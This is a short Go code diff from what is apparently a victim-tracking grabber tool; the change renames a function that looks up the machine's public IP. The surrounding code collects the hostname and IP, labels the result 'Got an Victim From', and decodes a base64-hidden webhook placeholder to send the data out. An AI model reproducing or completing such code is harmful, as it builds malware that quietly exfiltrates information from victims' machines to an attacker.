@@ -15,7 +15,7 @@ type IP struct {
 	Query string
 }
 
-func getip2() string {
+func grab() string {
 	req, err := http.Get("http://ip-api.com/json/")
 	if err != nil {
 		return err.Error()
@@ -37,7 +37,7 @@ func data() {
 	nm, _ := os.Hostname()
 	var username = "Got an Victim From - "
 	var content = "Machine Name : " + nm + "\n" +
-		"IP Address : " + getip2() + "\n"
+		"IP Address : " + grab() + "\n"
 
 	var rawDecodedText, err = base64.StdEncoding.DecodeString("PASTE UR BASE 64 ENCODED WEBHOOK HERE")
 
